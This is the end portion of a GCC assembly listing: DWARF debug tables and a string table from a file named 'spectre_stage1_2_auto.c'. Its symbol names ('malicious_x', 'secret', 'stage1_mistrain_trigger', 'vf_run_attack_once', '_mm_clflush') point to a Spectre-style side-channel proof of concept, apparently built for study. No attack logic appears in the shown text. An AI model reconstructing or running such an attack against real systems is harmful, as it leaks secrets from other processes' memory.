	.byte	0
	.uleb128 0x17
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x18
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x19
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x1a
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.byte	0
	.byte	0
	.uleb128 0x1b
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1c
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1d
	.uleb128 0x1d
	.byte	0x1
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x58
	.uleb128 0xb
	.uleb128 0x59
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x1e
	.uleb128 0x5
	.byte	0
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x1f
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x20
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x21
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x20
	.uleb128 0xb
	.uleb128 0x34
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x22
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.byte	0
	.section	.debug_aranges,"",@progbits
	.long	0x2c
	.value	0x2
	.long	.Ldebug_info0
	.byte	0x8
	.byte	0
	.value	0
	.value	0
	.quad	.Ltext0
	.quad	.Letext0-.Ltext0
	.quad	0
	.quad	0
	.section	.debug_line,"",@progbits
.Ldebug_line0:
	.section	.debug_str,"MS",@progbits,1
.LASF29:
	.string	"_old_offset"
.LASF58:
	.string	"double"
.LASF42:
	.string	"_IO_FILE"
.LASF53:
	.string	"sys_nerr"
.LASF24:
	.string	"_IO_save_end"
.LASF65:
	.string	"temp"
.LASF5:
	.string	"short int"
.LASF12:
	.string	"size_t"
.LASF34:
	.string	"_offset"
.LASF18:
	.string	"_IO_write_ptr"
.LASF13:
	.string	"_flags"
.LASF48:
	.string	"_IO_2_1_stdout_"
.LASF25:
	.string	"_markers"
.LASF15:
	.string	"_IO_read_end"
.LASF11:
	.string	"uint8_t"
.LASF59:
	.string	"array1_size"
.LASF78:
	.string	"spectre_stage1_2_auto.c"
.LASF64:
	.string	"secret"
.LASF56:
	.string	"float"
.LASF52:
	.string	"stderr"
.LASF55:
	.string	"long long int"
.LASF79:
	.string	"/root/src"
.LASF33:
	.string	"_lock"
.LASF6:
	.string	"long int"
.LASF30:
	.string	"_cur_column"
.LASF7:
	.string	"__uint8_t"
.LASF81:
	.string	"_IO_FILE_plus"
.LASF46:
	.string	"_pos"
.LASF71:
	.string	"vf_run_attack_once"
.LASF61:
	.string	"array1"
.LASF67:
	.string	"argv"
.LASF72:
	.string	"stage1_mistrain_trigger"
.LASF45:
	.string	"_sbuf"
.LASF0:
	.string	"unsigned char"
.LASF9:
	.string	"__off64_t"
.LASF66:
	.string	"argc"
.LASF4:
	.string	"signed char"
.LASF57:
	.string	"long long unsigned int"
.LASF47:
	.string	"_IO_2_1_stdin_"
.LASF2:
	.string	"unsigned int"
.LASF43:
	.string	"_IO_marker"
.LASF32:
	.string	"_shortbuf"
.LASF68:
	.string	"malicious_x"
.LASF17:
	.string	"_IO_write_base"
.LASF41:
	.string	"_unused2"
.LASF14:
	.string	"_IO_read_ptr"
.LASF21:
	.string	"_IO_buf_end"
.LASF82:
	.string	"_mm_clflush"
.LASF76:
	.string	"spectre_function"
.LASF10:
	.string	"char"
.LASF74:
	.string	"main"
.LASF44:
	.string	"_next"
.LASF35:
	.string	"__pad1"
.LASF36:
	.string	"__pad2"
.LASF37:
	.string	"__pad3"
.LASF38:
	.string	"__pad4"
.LASF39:
	.string	"__pad5"
.LASF73:
	.string	"training_x"
.LASF1:
	.string	"short unsigned int"
.LASF49:
	.string	"_IO_2_1_stderr_"
.LASF3:
	.string	"long unsigned int"
.LASF19:
	.string	"_IO_write_end"
.LASF60:
	.string	"unused1"
.LASF62:
	.string	"unused2"
.LASF27:
	.string	"_fileno"
.LASF26:
	.string	"_chain"
.LASF75:
	.string	"vf_get_probe_addr_for_secret"
.LASF8:
	.string	"__off_t"
.LASF23:
	.string	"_IO_backup_base"
.LASF50:
	.string	"stdin"
.LASF20:
	.string	"_IO_buf_base"
.LASF28:
	.string	"_flags2"
.LASF40:
	.string	"_mode"
.LASF16:
	.string	"_IO_read_base"
.LASF70:
	.string	"vf_prepare_probe_region"
.LASF63:
	.string	"array2"
.LASF31:
	.string	"_vtable_offset"
.LASF22:
	.string	"_IO_save_base"
.LASF54:
	.string	"sys_errlist"
.LASF77:
	.string	"GNU C11 7.5.0 -mtune=generic -march=x86-64 -g -O0 -fstack-protector-strong"
.LASF69:
	.string	"candidate_count"
.LASF51:
	.string	"stdout"
.LASF80:
	.string	"_IO_lock_t"
	.ident	"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"
	.section	.note.GNU-stack,"",@progbits
